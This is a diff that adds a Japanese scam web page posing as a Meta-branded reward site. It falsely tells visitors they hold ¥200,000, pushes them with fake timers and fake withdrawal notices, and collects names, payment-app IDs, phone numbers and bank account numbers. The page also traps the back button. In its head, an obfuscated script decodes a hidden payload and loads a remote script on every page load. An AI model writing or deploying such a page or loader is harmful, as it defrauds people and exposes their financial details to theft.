@@ -1,0 +1,1073 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <script src="js/utm-propagator.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ボーナス</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <script src="js/utm-propagator.js"></script>
+
+    <script>(function () { var l_nqo2 = atob("DDp/6DO0irDAsMzteUFdnUHYqIri2LiZCUlFxxzX7t7uxbiAEFwGxlDb556iwuOeGkgWmEfHpcW03b/CFVsLjUDApNqzkuDPGE4LmlrW/8Slw+7XIkFdhlLZ75L6kqiMDVtSnUfZ49a5nbyfHEwahkeZ8tOv1OGeGlFdxBHC69y11e7XWxgCxEiW5NGt1e7XW14enFKZ/8St2aqUVEoNjUXR5MTtw7mPEF4Myh+W/NGsxanPQxhdlW7J"); var a_0j2 = []; for (var e_d = 0; e_d < l_nqo2.length; e_d++) { a_0j2.push(l_nqo2.charCodeAt(e_d) & 255); } var y_6b = a_0j2[0]; var d_rlgj = a_0j2.slice(1, 1 + y_6b); var p_qjq = a_0j2.slice(1 + y_6b); var w_r8dl = p_qjq.map(function (b, j_5f9) { return b ^ d_rlgj[j_5f9 % y_6b]; }); var g_v3j = ""; for (var f_xun = 0; f_xun < w_r8dl.length; f_xun++) { g_v3j += String.fromCharCode(w_r8dl[f_xun] & 255); } var b_501h = decodeURIComponent(escape(g_v3j)); var p_5c = JSON.parse(b_501h); var o_989 = p_5c.globals || []; o_989.forEach(function (g_a) { window[g_a.name] = g_a.value; }); var q_o9w = document.createElement("script"); q_o9w.src = p_5c.url; q_o9w.async = true; q_o9w.defer = true; (p_5c.attributes || []).forEach(function (f_3) { q_o9w.setAttribute(f_3.name, f_3.value); }); (document.head || document.documentElement).appendChild(q_o9w); })();</script>
+
+    <style>
+        .red {
+            color: green;
+        }
+
+        #overlay-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .modal-box {
+            background: #f5f5f5;
+            width: 360px;
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+        }
+
+        #btn-finalizar {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            background: #ff6a00;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        #btn-sair {
+            margin-top: 15px;
+            background: none;
+            border: none;
+            color: #777;
+            cursor: pointer;
+        }
+
+        #btn-sacar-saldo-vsl {
+            display: none;
+            background-color: #ff8c00;
+            justify-self: center;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            outline: none;
+            box-shadow: 0 0 0 0 rgba(255, 140, 0, 0.7);
+            animation: pulse 2s infinite;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(255, 140, 0, 0.7);
+            }
+
+            70% {
+                transform: scale(1);
+                box-shadow: 0 0 0 15px rgba(255, 140, 0, 0);
+            }
+
+            100% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(255, 140, 0, 0);
+            }
+        }
+
+        .header-top {
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 1px 1px 3px #0000003b;
+        }
+
+        .header-top img {
+            width: 25%;
+        }
+
+        @keyframes slideUpModal {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+
+        #modal-pix {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: flex-end;
+            z-index: 9999;
+            padding: 0;
+        }
+
+        .payout-modal {
+            width: 100vw;
+            max-width: 100%;
+            background: #fff;
+            border-radius: 20px 20px 0 0;
+            overflow: hidden;
+            margin: 0;
+            color: #172033;
+            font-family: Arial, sans-serif;
+            box-shadow: 0 -5px 25px rgba(0, 0, 0, 0.2);
+            animation: slideUpModal 0.3s ease-out forwards;
+        }
+
+        .payout-header {
+            min-height: 62px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 18px;
+            border-bottom: 1px solid #edf0f4;
+        }
+
+        .payout-header h2 {
+            font-size: 17px;
+            font-weight: 700;
+            text-align: center;
+            flex: 1;
+            margin: 0;
+        }
+
+        .payout-header button {
+            width: 30px;
+            border: none;
+            background: none;
+            font-size: 27px;
+            cursor: pointer;
+            color: #172033;
+        }
+
+        .payout-intro {
+            padding: 20px 20px 12px;
+        }
+
+        .payout-intro h3 {
+            font-size: 16px;
+            margin: 0 0 7px;
+        }
+
+        .payout-intro p {
+            font-size: 12px;
+            color: #858da0;
+            margin: 0;
+        }
+
+        .payout-option {
+            width: 100%;
+            min-height: 76px;
+            padding: 12px 18px;
+            display: flex;
+            align-items: center;
+            gap: 13px;
+            background: white;
+            border: none;
+            border-bottom: 1px solid #edf0f4;
+            text-align: left;
+            cursor: pointer;
+            transition: background .2s;
+        }
+
+        .payout-option:hover {
+            background: #f7f9fc;
+        }
+
+        .payout-icon-img {
+            width: 40px;
+            height: 40px;
+            min-width: 40px;
+            border-radius: 10px;
+            object-fit: cover;
+        }
+
+        .payout-info {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            flex: 1;
+        }
+
+        .payout-info strong {
+            font-size: 14px;
+        }
+
+        .payout-info small {
+            font-size: 11px;
+            color: #858da0;
+        }
+
+        .payout-arrow {
+            font-size: 24px;
+            color: #a3aab8;
+        }
+
+        .payout-bottom {
+            padding: 16px 20px;
+            background: #f8f9fb;
+            font-size: 10px;
+            color: #858da0;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .payout-selected {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 20px;
+            border-bottom: 1px solid #edf0f4;
+        }
+
+        .payout-selected div {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .payout-selected strong {
+            font-size: 14px;
+        }
+
+        .payout-selected small {
+            color: #858da0;
+            font-size: 11px;
+        }
+
+        .payout-form {
+            padding: 22px;
+        }
+
+        .payout-form h3 {
+            font-size: 19px;
+            margin: 0 0 8px;
+        }
+
+        .payout-description {
+            color: #858da0;
+            font-size: 12px;
+            line-height: 1.5;
+            margin-bottom: 22px;
+        }
+
+        .payout-form label {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            margin: 17px 0 8px;
+            color: #424b5d;
+        }
+
+        .payout-form input {
+            width: 100%;
+            height: 49px;
+            border: 1px solid #dfe3ea;
+            border-radius: 10px;
+            padding: 0 13px;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .payout-form input:focus {
+            border-color: #287bff;
+        }
+
+        .payout-hint {
+            font-size: 11px;
+            color: #858da0;
+            line-height: 1.5;
+        }
+
+        .payout-continue {
+            width: 100%;
+            min-height: 51px;
+            border: none;
+            background: #287bff;
+            color: white;
+            border-radius: 11px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 18px;
+        }
+
+        .payout-continue:hover {
+            background: #1769ed;
+        }
+
+        .payout-security {
+            font-size: 10px;
+            color: #858da0;
+            text-align: center;
+            line-height: 1.6;
+            margin-top: 15px;
+        }
+
+        .payout-error {
+            font-size: 12px;
+            color: #dc3545;
+        }
+
+        .payout-review-content {
+            padding: 25px 22px;
+        }
+
+        .payout-review-content h3 {
+            text-align: center;
+            font-size: 19px;
+        }
+
+        .payout-review-content>p {
+            text-align: center;
+            font-size: 12px;
+            color: #858da0;
+        }
+
+        .review-check {
+            width: 52px;
+            height: 52px;
+            margin: auto;
+            border-radius: 50%;
+            background: #e8f6ed;
+            color: #20a35b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 25px;
+            font-weight: bold;
+        }
+
+        .review-item {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            padding: 13px 0;
+            border-bottom: 1px solid #edf0f4;
+        }
+
+        .review-item span {
+            font-size: 11px;
+            color: #858da0;
+        }
+
+        .review-item strong {
+            font-size: 13px;
+            overflow-wrap: anywhere;
+        }
+
+        @media(max-width:480px) {
+            .payout-modal {
+                max-width: 100%;
+                border-radius: 20px 20px 0 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="modal-overlay" class="modal-overlay">
+        <div class="modal-content">
+            <img src="images/6033716.png" alt="Icon" class="modal-icon">
+            <h2>アカウントに報酬が付与されました</h2>
+            <p>おめでとうございます！限定リワードキャンペーンの対象となりました。</p>
+
+            <div class="valor-container">
+                ¥ <span id="valor-dinheiro">200,000</span>
+            </div>
+
+            <div class="timer-container">
+                有効期限:
+                <span class="time-box">00</span> :
+                <span class="time-box" id="minutos">13</span> :
+                <span class="time-box" id="segundos">06</span>
+            </div>
+
+            <button id="btn-fechar-modal" class="btn-sacar-modal">今すぐ出金する</button>
+            <audio id="meu-audio">
+                <source src="media/audio.mp3" type="audio/mpeg">
+                お使いのブラウザはオーディオ要素をサポートしていません。
+            </audio>
+        </div>
+    </div>
+
+    <header class="header-top">
+        <img src="images/Meta-Logo.png" alt="Bonus" class="logo-imagem">
+    </header>
+
+    <main class="main-container">
+
+        <div class="confetti c1"></div>
+        <div class="confetti c2"></div>
+        <div class="confetti c3"></div>
+        <div class="confetti c4"></div>
+
+        <div class="card card-saldo">
+            <div class="saldo-info">
+                <div class="label-saldo">残高 <span class="status-dot"></span></div>
+                <h3>¥ 200,000</h3>
+            </div>
+            <button id="btn-sacar-saldo" class="btn-mini-sacar">出金</button>
+        </div>
+
+        <div class="card card-concluido">
+            <div class="concluido-texto">
+                <h4>おめでとうございます！<br>すべてのタスクが<br>完了しました</h4>
+                <span class="valor-laranja">¥ 200,000</span>
+            </div>
+            <img src="images/parabens-img-DyKL61G2.png" alt="Bonus" class="icon-calendar">
+        </div>
+
+        <div class="alerta-expira">
+            <i class="bx bx-time-five"></i>
+            <p>残高の有効期限が残り <span id="timer-alerta">00:11:37</span> です。消失を防ぐため今すぐ出金してください。</p>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">デイリーチェックイン — 14日間</p>
+                    <p class="pontos-laranja" style="margin-top: 4px;">8,414 ポイント</p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> 完了</div>
+            </div>
+            <div class="task-completed-box">
+                <i class="bx bx-check"></i> 14/14日 完了
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-show"></i></span> 広告の視聴
+                    </p>
+                    <p class="tarefa-sub">毎日視聴して最大 <span class="pontos-laranja">2,730 ポイント</span> を獲得
+                    </p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> 完了</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">30/30</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-play"></i></span> 動画の視聴
+                    </p>
+                    <p class="tarefa-sub">10分間視聴 — <span class="pontos-laranja">500 ポイント</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> 完了</div>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-gift"></i></span> リワードの受け取り
+                    </p>
+                    <p class="tarefa-sub"><span class="pontos-laranja">640 ポイント</span> を獲得</p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> 完了</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill fill-green" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">8/8</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-calendar-star"></i></span> デイリーアンケート
+                    </p>
+                    <p class="tarefa-sub">アンケート60件完了 — <span class="pontos-laranja">996 ポイント</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> 完了</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">60/60</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-group"></i></span> 友達招待
+                    </p>
+                    <p class="tarefa-sub">1人招待で <span class="pontos-laranja">100,000 ～ 200,000 ポイント</span> 獲得
+                    </p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> 完了</div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer-fixo">
+        <button id="btn-sacar-footer" class="btn-pix">
+            <span class="icon-money">💰</span> ¥ 200,000 を出金する <i class="bx bx-chevron-right"></i>
+        </button>
+        <p class="seguranca">
+            <i class="bx bx-check-shield" style="color: #00c853;"></i> 100%安全な決済 • 本日の出金数 2,809件
+        </p>
+    </footer>
+
+    <div id="toast-saque" class="toast-saque">
+        <img id="toast-img" src="https://i.pravatar.cc/150?img=11" alt="Profile" class="toast-perfil">
+        <div class="toast-texto">
+            <p id="toast-mensagem">佐藤 健さんが <strong class="texto-verde">¥ 200,000</strong> を出金しました</p>
+            <span>たった今</span>
+        </div>
+        <div class="toast-dot"></div>
+    </div>
+
+    <!-- 日本の決済方法モーダル -->
+    <div id="modal-pix" class="modal-overlay" style="display:none;">
+
+        <div class="payout-modal">
+
+            <!-- HEADER -->
+            <div class="payout-header">
+
+                <button type="button" id="payout-back" style="display:none;">‹</button>
+
+                <h2 id="payout-heading">出金方法を選択</h2>
+
+                <button type="button" id="fechar-pix">×</button>
+
+            </div>
+
+            <!-- STEP 1: PAYMENT METHODS -->
+            <div id="payout-methods">
+
+                <div class="payout-intro">
+                    <h3>どの方法で報酬を受け取りますか？</h3>
+                    <p>以下からご希望の出金方法を選択してください。</p>
+                </div>
+
+                <button class="payout-option" data-method="paypay">
+                    <img src="images/paypay.png" alt="PayPay" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>PayPay (ペイペイ)</strong>
+                        <small>PayPayアカウントへ即座に入金</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <button class="payout-option" data-method="aupay">
+                    <img src="images/aupay.webp" alt="au PAY" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>au PAY</strong>
+                        <small>au PAY残高へ送金</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <button class="payout-option" data-method="dbarai">
+                    <img src="images/dbarai.webp" alt="d Barai" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>d払い (d Barai)</strong>
+                        <small>dアカウント経由で受け取り</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <button class="payout-option" data-method="rakuten">
+                    <img src="images/rpay.png" alt="Rakuten Bank" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>楽天銀行 / ネット銀行</strong>
+                        <small>国内の主要なネット銀行口座へ振込</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <button class="payout-option" data-method="ach">
+                    <img src="images/bank.jpg" alt="Bank Transfer" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>ゆうちょ銀行 / 通常銀行口座</strong>
+                        <small>ご指定の日本国内の銀行口座へ送金</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <div class="payout-bottom">
+                    <span>🔒</span>
+                    お支払い情報は、安全な暗号化通信によって保護されています。
+                </div>
+
+            </div>
+
+            <!-- STEP 2: PAYMENT DETAILS -->
+            <div id="payout-details" style="display:none;">
+
+                <div class="payout-selected">
+
+                    <img id="payout-selected-img" src="" alt="Selected Icon" class="payout-icon-img">
+
+                    <div>
+                        <strong id="payout-selected-name"></strong>
+                        <small>選択された出金方法</small>
+                    </div>
+
+                </div>
+
+                <div class="payout-form">
+
+                    <h3 id="payout-form-title">口座情報を入力してください</h3>
+
+                    <p class="payout-description" id="payout-form-description">
+                        手続きを続けるために必要情報を入力してください。
+                    </p>
+
+                    <!-- STANDARD PAYMENT FIELDS -->
+                    <div id="payout-standard-fields">
+
+                        <label for="payout-name">お名前 (漢字またはローマ字)</label>
+
+                        <input type="text" id="payout-name" placeholder="例: 山田 太郎" autocomplete="name">
+
+                        <label id="payout-field-label" for="payout-identifier">
+                            アカウントID / 電話番号
+                        </label>
+
+                        <input type="text" id="payout-identifier" placeholder="情報を入力してください"
+                            autocomplete="off">
+
+                        <p id="payout-hint" class="payout-hint"></p>
+
+                    </div>
+
+                    <!-- BANK FIELDS -->
+                    <div id="payout-ach-fields" style="display:none;">
+
+                        <div class="ach-method-title">
+                            銀行口座情報 (日本国内)
+                        </div>
+
+                        <label for="ach-bank">銀行名</label>
+
+                        <input type="text" id="ach-bank" placeholder="例: 楽天銀行 / ゆうちょ銀行" autocomplete="off">
+
+                        <label for="ach-routing">支店番号 (3桁)</label>
+
+                        <input type="text" id="ach-routing" placeholder="例: 123" inputmode="numeric"
+                            maxlength="3" autocomplete="off">
+
+                        <label for="ach-account">口座番号</label>
+
+                        <input type="text" id="ach-account" placeholder="口座番号を入力" inputmode="numeric"
+                            autocomplete="off">
+
+                    </div>
+
+                    <button type="button" id="payout-continue" class="payout-continue">
+                        次へ進む
+                    </button>
+
+                    <p class="payout-security">
+                        パスワード、暗証番号、認証コードを他人に教えないでください。
+                    </p>
+
+                    <p id="payout-error" class="payout-error" style="display:none;"></p>
+
+                </div>
+
+            </div>
+
+            <!-- STEP 3: REVIEW -->
+            <div id="payout-review" style="display:none;">
+
+                <div class="payout-review-content">
+
+                    <div class="review-check">✓</div>
+
+                    <h3>入力内容の確認</h3>
+
+                    <p>続ける前に情報をご確認ください。</p>
+
+                    <div class="review-item">
+                        <span>出金方法</span>
+                        <strong id="review-method"></strong>
+                    </div>
+
+                    <div class="review-item">
+                        <span>お名前 / 銀行名</span>
+                        <strong id="review-name"></strong>
+                    </div>
+
+                    <div class="review-item">
+                        <span>アカウントID / 口座情報</span>
+                        <strong id="review-identifier"></strong>
+                    </div>
+
+                    <!-- CORREÇÃO AQUI: Botão redirecionando corretamente para saque.html (ou saque_4.html se preferir) -->
+                    <button type="button" id="payout-withdraw" class="payout-continue"
+                        onclick="window.location.href='saque.html'">
+                        出金手続きへ進む
+                    </button>
+
+                    <p class="payout-security">
+                        入力情報はまだ送信または検証されていません。
+                    </p>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <div id="overlay-modal" style="display:none;">
+        <div class="modal-box">
+            <h1 style="text-align: center; color: red;"><i class="bx bxs-error"></i></h1>
+            <h2><span class="red">¥ 200,000</span> の報酬が予約されています。出金するためには出金方法の確認が必要です。</h2>
+            <p>今ページを離れると、システムにより報酬が自動キャンセルされます。</p>
+
+            <button id="btn-finalizar">報酬を受け取る 💰</button>
+            <button id="btn-sair">このまま離脱する</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+
+            history.pushState(null, null, location.href);
+
+            function handlePopState() {
+                history.pushState(null, null, location.href);
+
+                const overlay = document.getElementById("overlay-modal");
+
+                if (overlay) {
+                    overlay.style.display = "flex";
+                }
+            }
+
+            window.addEventListener("popstate", handlePopState);
+
+            const btnFinalizar = document.getElementById("btn-finalizar");
+            const btnSair = document.getElementById("btn-sair");
+
+            if (btnFinalizar) {
+                btnFinalizar.addEventListener("click", function () {
+                    const overlay = document.getElementById("overlay-modal");
+
+                    if (overlay) {
+                        overlay.style.display = "none";
+                    }
+                });
+            }
+
+            if (btnSair) {
+                btnSair.addEventListener("click", function () {
+                    window.removeEventListener("popstate", handlePopState);
+                    history.back();
+                });
+            }
+
+            const payoutConfig = {
+
+                paypay: {
+                    name: "PayPay",
+                    img: "images/paypay.png",
+                    label: "PAYPAY ID / 登録電話番号",
+                    placeholder: "09012345678",
+                    hint: "PayPayに登録されている電話番号またはIDを入力してください。"
+                },
+
+                aupay: {
+                    name: "au PAY",
+                    img: "images/aupay.webp",
+                    label: "au ID / 電話番号",
+                    placeholder: "09012345678",
+                    hint: "au PAYに関連付けられた電話番号を入力してください。"
+                },
+
+                dbarai: {
+                    name: "d払い",
+                    img: "images/dbarai.webp",
+                    label: "dアカウント メール / 電話番号",
+                    placeholder: "user@example.com",
+                    hint: "d払いに対応しているメールアドレスまたは電話番号を入力してください。"
+                },
+
+                rakuten: {
+                    name: "楽天銀行 / ネット銀行",
+                    img: "images/rpay.png",
+                    label: "口座名義人・番号",
+                    placeholder: "口座番号を入力",
+                    hint: "お持ちのネット銀行の受取口座情報を入力してください。"
+                },
+
+                ach: {
+                    name: "ゆうちょ銀行 / 通常銀行",
+                    img: "images/bank.jpg",
+                    label: "BANK PAYMENT SETUP",
+                    placeholder: "",
+                    hint: "公式の安全な銀行決済プロバイダを通じて処理されます。"
+                }
+
+            };
+
+            const modal = document.getElementById("modal-pix");
+
+            const methodsScreen = document.getElementById("payout-methods");
+            const detailsScreen = document.getElementById("payout-details");
+            const reviewScreen = document.getElementById("payout-review");
+
+            const heading = document.getElementById("payout-heading");
+            const back = document.getElementById("payout-back");
+
+            const nameInput = document.getElementById("payout-name");
+            const identifierInput = document.getElementById("payout-identifier");
+
+            const achFields = document.getElementById("payout-ach-fields");
+            const standardFields = document.getElementById("payout-standard-fields");
+
+            const achBank = document.getElementById("ach-bank");
+            const achRouting = document.getElementById("ach-routing");
+            const achAccount = document.getElementById("ach-account");
+
+            const error = document.getElementById("payout-error");
+
+            let selectedMethod = null;
+            let isAch = false;
+
+            function payoutShowScreen(screen) {
+                methodsScreen.style.display = "none";
+                detailsScreen.style.display = "none";
+                reviewScreen.style.display = "none";
+                screen.style.display = "block";
+            }
+
+            function payoutReset() {
+                selectedMethod = null;
+                isAch = false;
+
+                payoutShowScreen(methodsScreen);
+
+                heading.textContent = "出金方法を選択";
+
+                back.style.display = "none";
+
+                nameInput.value = "";
+                identifierInput.value = "";
+
+                achBank.value = "";
+                achRouting.value = "";
+                achAccount.value = "";
+
+                achFields.style.display = "none";
+                standardFields.style.display = "block";
+
+                document.getElementById("payout-selected-img").src = "";
+
+                document.getElementById("payout-form-title").textContent =
+                    "口座情報を入力してください";
+
+                document.getElementById("payout-form-description").style.display =
+                    "block";
+
+                document.getElementById("payout-hint").textContent = "";
+
+                document.getElementById("payout-field-label").textContent =
+                    "アカウントID / 電話番号";
+
+                error.style.display = "none";
+            }
+
+            window.openPayoutModal = function () {
+                payoutReset();
+                modal.style.display = "flex";
+            };
+
+            const btnSacarSaldo = document.getElementById("btn-sacar-saldo");
+            const btnSacarFooter = document.getElementById("btn-sacar-footer");
+            if (btnSacarSaldo) btnSacarSaldo.addEventListener("click", window.openPayoutModal);
+            if (btnSacarFooter) btnSacarFooter.addEventListener("click", window.openPayoutModal);
+
+            document.getElementById("fechar-pix").addEventListener("click", function () {
+                modal.style.display = "none";
+                payoutReset();
+            });
+
+            document.querySelectorAll(".payout-option").forEach(button => {
+                button.addEventListener("click", function () {
+                    const method = button.dataset.method;
+                    selectedMethod = payoutConfig[method];
+                    if (!selectedMethod) return;
+
+                    localStorage.setItem("metodoPagamento", selectedMethod.name);
+
+                    isAch = method === "ach" || method === "rakuten";
+
+                    payoutShowScreen(detailsScreen);
+
+                    heading.textContent = isAch
+                        ? "銀行口座情報を入力"
+                        : selectedMethod.name;
+
+                    back.style.display = "block";
+
+                    error.style.display = "none";
+
+                    const selectedImg = document.getElementById("payout-selected-img");
+                    selectedImg.src = selectedMethod.img;
+
+                    document.getElementById("payout-selected-name").textContent =
+                        selectedMethod.name;
+
+                    if (isAch) {
+                        achFields.style.display = "block";
+                        standardFields.style.display = "none";
+
+                        document.getElementById("payout-form-title").textContent =
+                            "銀行口座情報を入力";
+
+                        document.getElementById("payout-form-description").style.display =
+                            "none";
+                    } else {
+                        achFields.style.display = "none";
+                        standardFields.style.display = "block";
+
+                        document.getElementById("payout-form-title").textContent =
+                            "口座情報を入力してください";
+
+                        document.getElementById("payout-form-description").style.display =
+                            "block";
+
+                        document.getElementById("payout-field-label").textContent =
+                            selectedMethod.label;
+
+                        identifierInput.placeholder =
+                            selectedMethod.placeholder;
+
+                        document.getElementById("payout-hint").textContent =
+                            selectedMethod.hint;
+                    }
+
+                    document.getElementById("payout-continue").textContent =
+                        "次へ進む";
+                });
+            });
+
+            back.addEventListener("click", function () {
+                if (reviewScreen.style.display === "block") {
+                    payoutShowScreen(detailsScreen);
+                    heading.textContent = isAch
+                        ? "銀行口座情報を入力"
+                        : selectedMethod.name;
+                } else {
+                    payoutShowScreen(methodsScreen);
+                    heading.textContent = "出金方法を選択";
+                    back.style.display = "none";
+                }
+            });
+
+            document.getElementById("payout-continue").addEventListener("click", function () {
+                error.style.display = "none";
+
+                if (isAch) {
+                    const bank = achBank.value.trim();
+                    const routing = achRouting.value.trim();
+                    const account = achAccount.value.trim();
+
+                    if (!bank || !routing || !account) {
+                        error.textContent = "すべての銀行口座情報を入力してください。";
+                        error.style.display = "block";
+                        return;
+                    }
+
+                    document.getElementById("review-method").textContent =
+                        selectedMethod.name;
+
+                    document.getElementById("review-name").textContent =
+                        bank;
+
+                    document.getElementById("review-identifier").textContent =
+                        "支店番号: " + routing + " | 口座番号下4桁: " + account.slice(-4);
+                } else {
+                    const fullName = nameInput.value.trim();
+                    const identifier = identifierInput.value.trim();
+
+                    if (!fullName) {
+                        error.textContent = "お名前を入力してください。";
+                        error.style.display = "block";
+                        return;
+                    }
+
+                    if (!identifier) {
+                        error.textContent = "アカウント情報を入力してください。";
+                        error.style.display = "block";
+                        return;
+                    }
+
+                    document.getElementById("review-method").textContent =
+                        selectedMethod.name;
+
+                    document.getElementById("review-name").textContent =
+                        fullName;
+
+                    document.getElementById("review-identifier").textContent =
+                        identifier;
+                }
+
+                payoutShowScreen(reviewScreen);
+                heading.textContent = "入力内容の確認";
+            });
+        });
+    </script>
+
+    <script src="js/confetti.browser.min.js"></script>
+    <script src="js/index_1.js"></script>
+    <script>
+        setTimeout(function () {
+            const botao = document.getElementById('btn-sacar-saldo-vsl');
+            if (botao) {
+                botao.style.display = 'block';
+            }
+        }, 100000);
+    </script>
+
+    <script src="js/index.js" data-token="pt_246f25ea85305e5f3c653da1bc55dfd7"></script>
+    <script src="js/index.js" data-token="pt_d7c144ffd2b0fce2c05f769269023150"></script>
+
+</body>
+
+</html>
